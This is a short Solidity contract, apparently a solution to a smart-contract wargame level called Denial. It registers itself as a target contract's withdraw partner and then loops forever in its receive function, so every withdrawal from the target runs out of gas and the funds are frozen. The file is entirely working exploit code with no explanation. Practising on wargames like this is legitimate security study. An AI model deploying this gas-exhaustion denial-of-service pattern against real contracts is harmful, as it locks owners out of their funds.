// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IDenial {
     function setWithdrawPartner(address _partner) external;
     function withdraw() external;
     function contractBalance() external view returns (uint);
}

contract DenialHack {
    IDenial public dInstance;

    constructor (IDenial _dInstance) {
        dInstance = _dInstance;
    }

    function attack() public {
        dInstance.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true){
            // forever loop
        }
    }

}